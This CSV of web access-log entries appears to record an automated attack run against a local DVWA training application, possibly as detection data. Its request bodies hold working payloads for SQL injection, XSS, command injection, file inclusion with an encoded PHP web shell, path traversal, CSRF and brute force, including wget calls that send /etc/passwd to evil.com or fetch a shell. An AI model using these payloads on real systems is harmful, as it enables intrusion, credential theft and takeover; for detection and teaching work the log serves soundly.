_id,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
43357dff6b3e,4519,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin'+OR+'1'='1'+--&password=,200,2025-10-11T21:56:46
1bdcb00d73ef,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T21:56:46
e50cde00cb83,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:46
d5f2d9568dc5,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook&user_token=ccdffcaaaa3e03c034de0905a5689b51,302,2025-10-11T21:56:47
8f48f65a367f,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:47
3e16a0614650,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:47
c19d7f103235,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1&&+net+user+hacker+password123+/add&Submit=Submit&user_token=ced42dcd70956f14a678c3ae8bc8e29f,200,2025-10-11T21:56:47
878d5828e487,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+1,LOAD_FILE('/etc/passwd'),3--&Submit=Submit",302,2025-10-11T21:56:47
489e8d7c4a01,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:47
56f8a30dc414,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,name=<ScRiPt>alert('XSS')</ScRiPt>,302,2025-10-11T21:56:47
d1de56279e85,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:47
1371649c49ac,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_4r9InH&password_conf=hacked_t1JMPm&Change=Change,302,2025-10-11T21:56:48
cc64bf65e9cd,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:48
3a554659531d,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+1,2,3,4,5--&Submit=Submit",302,2025-10-11T21:56:48
173986b65d1d,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:48
3a554659531d,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+AND+(SELECT+LENGTH(database()))>5--&Submit=Submit,302,2025-10-11T21:56:48
173986b65d1d,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:56:48
f0be1bf55c6b,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1|+wget+--post-file=/etc/passwd+http://evil.com/collect.php&Submit=Submit,200,2025-10-11T21:56:48
e40381803cf6,0,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+whoami&Submit=Submit,302,2025-10-11T21:56:49
6a0c39a7f62d,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:49
55a035a40a22,5181,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,"default=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>",200,2025-10-11T21:56:49
1aadd5312f71,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:49
c090022ab099,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_jBJfD8&password_conf=hacked_AedLaZ&Change=Change&user_token=41d1743da31bce7bd490a83ebe42d0f7,200,2025-10-11T21:56:49
e7611cedc2d7,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:49
ceab2258966f,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,id='+AND+SLEEP(5)--&Submit=Submit&user_token=42d91e3543d4f4f58a421d582320d17c,200,2025-10-11T21:56:49
b928c085093f,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T21:56:50
c0db0b27f80b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:50
49a70fc8f1ae,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=93e7153e847fea199450562f88f08781",302,2025-10-11T21:56:50
c0db0b27f80b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:50
ae0f23642bc7,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id='+AND+(SELECT+LENGTH(database()))>5--&Submit=Submit,302,2025-10-11T21:56:50
7f92cb84c28c,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:56:50
e4fc868c1440,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,200,2025-10-11T21:56:50
7958624cac1d,4819,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin&password=shadow&user_token=0b3f1ad8ac30201c4f969820a50dd840,200,2025-10-11T21:56:50
b928c085093f,234918,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<iframe+src='javascript:alert(document.cookie)'></iframe>&mtxMessage=<body+onload=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T21:56:50
e56705dfad8c,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_JwWHol&password_conf=hacked_YhlhgI&Change=Change,302,2025-10-11T21:56:50
c0db0b27f80b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:50
1bf30dd1c311,234926,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook",200,2025-10-11T21:56:51
1bf30dd1c311,234926,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<iframe+src='javascript:alert(document.cookie)'></iframe>&mtxMessage=&lt;script&gt;alert('XSS')&lt;/script&gt;&btnSign=Sign+Guestbook,200,2025-10-11T21:56:51
0540ed627544,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:56:51
d8ac1d62006f,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+AND+(SELECT+SUBSTR(user(),1,1))='r'--&Submit=Submit&user_token=e8b4b720c92b6d458bc999044a898b7b",200,2025-10-11T21:56:51
377f7cd7fc3d,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_twwQ3O&password_conf=hacked_4AYjsG&Change=Change,302,2025-10-11T21:56:51
f8e14d0f7b82,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:51
b00eb40e0fc2,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:56:52
3cd1175d3eb3,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+user()),0x7e))--&Submit=Submit&user_token=045e02dcfbce1fab6ed68397f3fdb5c5",200,2025-10-11T21:56:52
043dbbfc5b94,234926,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:52
18c9a03c5486,235142,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=<body+onload=alert('XSS')>&btnSign=Sign+Guestbook&user_token=76e7baa2be86f5db9b55614de2fde196,200,2025-10-11T21:56:52
e07fcaa5efe2,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_ZywVL7&password_conf=hacked_u93hBA&Change=Change,302,2025-10-11T21:56:53
253edad41ed3,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:53
d2bae2970d3a,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<input+type='image'+src='x'+onerror='alert(String.fromCharCode(88,83,83))'>&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook",302,2025-10-11T21:56:53
564e8edf5002,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:53
7cc3b3e06f33,5181,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,"default=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">",200,2025-10-11T21:56:53
d2bae2970d3a,235142,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook",200,2025-10-11T21:56:53
1a355e0c068f,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,"name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",302,2025-10-11T21:56:54
fe22a3ca3fdc,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:54
06cdfb101bb6,0,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,"page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",302,2025-10-11T21:56:54
d637b18a47f4,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:54
8ba35b6ff852,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1&&+whoami&Submit=Submit,200,2025-10-11T21:56:54
d9abd3aea15f,4819,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=root&password=root,200,2025-10-11T21:56:54
b4303d8cffd4,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_XGGg8k&password_conf=hacked_5VUenc&Change=Change,302,2025-10-11T21:56:54
ecdd97b8476e,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:56:54
46c6ce6eda6c,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_i5s412&password_conf=hacked_YH4bD2&Change=Change,302,2025-10-11T21:56:55
005b9b94d879,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:55
8043f8717936,155,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/,HTTP/1.1,name=<img+src=x+onerror=alert('XSS')>,302,2025-10-11T21:56:55
d7b7b3b1a1ca,4964,127.0.0.1,GET,/DVWA/vulnerabilities/xss_r/index.php,HTTP/1.1,,200,2025-10-11T21:56:55
46c6ce6eda6c,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:55
f75974ebb773,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_dElpdt&password_conf=hacked_7Srw6d&Change=Change&user_token=3f976780bd33ee9d7dd59ddff00b628d,200,2025-10-11T21:56:55
168e8ed4fed8,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:55
711ff287aeea,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+sleep+10&Submit=Submit&user_token=6ab242d2b5bfda6bc7796a9666a67728,200,2025-10-11T21:56:55
028a014e590d,0,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,302,2025-10-11T21:56:56
503faecbfad8,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:56
b01001fc14f1,0,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin&password=master&user_token=90f19f255ffb1599be1658e4eea39288,302,2025-10-11T21:56:56
503faecbfad8,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:56
80aeb7e42dea,235142,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:56
d1dd21be7619,235417,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<form><button+formaction=javascript:alert('XSS')>Click</button></form>&btnSign=Sign+Guestbook&user_token=3afd211019c3070cac628d5b6cd43d79,200,2025-10-11T21:56:56
80aeb7e42dea,235417,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T21:56:56
63e51a4542d2,235666,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=&lt;script&gt;alert('XSS')&lt;/script&gt;&btnSign=Sign+Guestbook&user_token=290c71913744451e8bb521b8e457b2f3,200,2025-10-11T21:56:57
6c25fb425bff,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:57
f3618a2f96c1,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+$(echo+'d2hvYW1p'|base64+-d)&Submit=Submit&user_token=456decd26c4ffd5d62c08b286f488a15,200,2025-10-11T21:56:57
921310dd09f9,0,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,302,2025-10-11T21:56:57
0ec55cce522e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:57
c105e52283b0,0,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=shadow&user_token=f4be398c21314be7a5305554c75f85a3,302,2025-10-11T21:56:57
0ec55cce522e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:57
6c25fb425bff,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:56:57
f3618a2f96c1,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1&&+wget+http://evil.com/shell.php+-O+/tmp/shell.php&Submit=Submit&user_token=963fb2d3460112dff966f46397924242,200,2025-10-11T21:56:57
6c25fb425bff,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1&&+net+user+hacker+password123+/add&Submit=Submit,200,2025-10-11T21:56:57
2f75e406956c,5181,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,default=<svg+onload=alert('XSS')>,200,2025-10-11T21:56:58
41780a1656af,0,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+1,concat(user,':',password),3+FROM+users--&Submit=Submit",302,2025-10-11T21:56:58
14c27b3bbc2b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:58
a7b15a3694f2,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:58
2afd6e372e9a,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_fNMj3y&password_conf=hacked_WEk3g1&Change=Change&user_token=fdec726343c7825df7ffe4f1ffcffd3a,200,2025-10-11T21:56:58
040ade87eacb,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+ls+-la+/&Submit=Submit,200,2025-10-11T21:56:58
db4018465cc1,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:56:59
e902c5f16be6,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_3vC5Ow&password_conf=hacked_8Hrc7D&Change=Change&user_token=360b51d9ca271bdf1b3d84d7eac6669e,200,2025-10-11T21:56:59
861aa4fe923c,0,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,302,2025-10-11T21:56:59
17ea43a1d0a2,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:59
61a2233555cd,0,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=master&user_token=d6b1235a324c95d6ea75a19a6b378ce7,302,2025-10-11T21:56:59
17ea43a1d0a2,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:56:59
5d86d487091f,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:57:01
e6b853b3ce08,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_UPzKu9&password_conf=hacked_9mycPz&Change=Change&user_token=676f94dedd8bd0fc0173842101e8feb8,200,2025-10-11T21:57:01
5d86d487091f,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:57:01
e6b853b3ce08,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_EmRDBq&password_conf=hacked_Vrbekg&Change=Change&user_token=a8b6aa6c92bb19984fb253a5885488b4,200,2025-10-11T21:57:01
b91bd01d7f14,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_rpXf6o&password_conf=hacked_uEnLSE&Change=Change,302,2025-10-11T21:57:02
49e1df1fb692,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:57:02
b91bd01d7f14,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T21:57:02
865b0fda250e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:02
1fdca07f96b8,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_SQYCcw&password_conf=hacked_4nRqK2&Change=Change&user_token=f400f49fb16379913ad51e2a58209cbf,302,2025-10-11T21:57:02
865b0fda250e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:02
aef72a09dbf7,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:57:02
d6791fff1fcb,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit&user_token=f4ab6d0e888b23b86891a51c045d3868",200,2025-10-11T21:57:02
b91bd01d7f14,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:57:02
1fdca07f96b8,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_kBbsSs&password_conf=hacked_US6Ksf&Change=Change&user_token=9b794e7736ffb88167012634565820d4,200,2025-10-11T21:57:02
a2e8ff9760db,22,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=C:\xampp\apache\logs\access.log,200,2025-10-11T21:57:02
cdfc474e1d4e,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T21:57:02
865b0fda250e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:02
00989ef613f5,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=3b01e3c052589802e236c0be9aa3fbbb",302,2025-10-11T21:57:02
cb52e49962ee,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:03
e1926f28cccd,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=$gt&password=$gt,200,2025-10-11T21:57:03
ba3f440b5beb,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_0DkBCU&password_conf=hacked_DsLF7h&Change=Change,302,2025-10-11T21:57:03
2dfc87c61427,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:57:03
4970b96b55d2,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+null,user(),database(),version(),null--&Submit=Submit",302,2025-10-11T21:57:03
e4c523faab57,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:57:03
7f4b9c0e8bce,0,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+echo+d2hvYW1p|base64+-d|sh&Submit=Submit,302,2025-10-11T21:57:03
cb52e49962ee,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:03
ba3f440b5beb,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T21:57:03
1ded39c15c87,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_5lOyw8&password_conf=hacked_WhYhTb&Change=Change&user_token=d59ed7e94518f83389adb2f5b1c3af67,200,2025-10-11T21:57:03
e94696d9cceb,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,200,2025-10-11T21:57:04
80715d5883b3,4519,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin&password=dragon,200,2025-10-11T21:57:04
e84fe8678ed8,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_QlYHa0&password_conf=hacked_cwo81M&Change=Change,302,2025-10-11T21:57:04
86e396cc8687,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T21:57:04
e84fe8678ed8,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_AdZq0y&password_conf=hacked_EjXACs&Change=Change,302,2025-10-11T21:57:04
ef25965d06e0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:04
a80ded9cb407,154,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,"id='+AND+(SELECT+SUBSTR(user(),1,1))='r'--&Submit=Submit",302,2025-10-11T21:57:04
95d75134745d,4808,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/index.php,HTTP/1.1,,200,2025-10-11T21:57:04
b0679c594cdd,22,127.0.0.1,GET,/DVWA/vulnerabilities/fi/,HTTP/1.1,page=../../../etc/passwd,200,2025-10-11T21:57:04
1c3090ecb958,4756,127.0.0.1,GET,/DVWA/vulnerabilities/exec/,HTTP/1.1,,200,2025-10-11T21:57:05
37205b207195,4805,127.0.0.1,POST,/DVWA/vulnerabilities/exec/,HTTP/1.1,ip=127.0.0.1;+whoami&Submit=Submit&user_token=5c88c02089273bcbe2fb2322c96902f7,200,2025-10-11T21:57:05
0d24c9a082c2,0,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=$ne&password=$ne,302,2025-10-11T21:57:05
baa3bea1c6be,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:05
c2534a3586e3,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=admin'+OR+'1'='1'+--&password=,200,2025-10-11T21:57:05
c275dbcb8bd2,4727,127.0.0.1,GET,/DVWA/vulnerabilities/sqli/,HTTP/1.1,,200,2025-10-11T21:57:05
306be1dc2da3,4727,127.0.0.1,POST,/DVWA/vulnerabilities/sqli/,HTTP/1.1,id=';+return+true;+//&Submit=Submit&user_token=21728e5b9f19d56af695d3056f80c152,200,2025-10-11T21:57:05
bb60dad59d05,235666,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook",200,2025-10-11T21:57:06
a6f120827159,0,127.0.0.1,GET,/DVWA/vulnerabilities/brute/,HTTP/1.1,,302,2025-10-11T21:57:06
a080daf20eed,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:06
65dc88470ed6,0,127.0.0.1,POST,/DVWA/vulnerabilities/brute/,HTTP/1.1,username=admin&password=monkey&user_token=3bbeb991b3d7ad03f3a399892628dfba,302,2025-10-11T21:57:06
a080daf20eed,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T21:57:06
ab727167a92b,4796,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,,200,2025-10-11T21:57:06
119bb842eaf0,4796,127.0.0.1,POST,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+UNION+SELECT+1,2,3+INTO+OUTFILE+'/tmp/evil.php'--&Submit=Submit&user_token=42ccd7d75bad0e12a2bba42f1e7b35fe",200,2025-10-11T21:57:06
0ec5bb27d668,4519,127.0.0.1,GET,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,,200,2025-10-11T21:57:06
71d869c818d1,4519,127.0.0.1,POST,/DVWA/vulnerabilities/authbypass/,HTTP/1.1,username=root&password=root,200,2025-10-11T21:57:06
0b0107cf69e7,160,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/,HTTP/1.1,"id='+AND+(SELECT+*+FROM+(SELECT+COUNT(*),CONCAT((SELECT+database()),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)--&Submit=Submit",302,2025-10-11T21:57:07
561dd5d9cf00,4877,127.0.0.1,GET,/DVWA/vulnerabilities/sqli_blind/index.php,HTTP/1.1,,200,2025-10-11T21:57:07
a9a8d58c95c3,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_d/,HTTP/1.1,"default=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>",302,2025-10-11T21:57:07
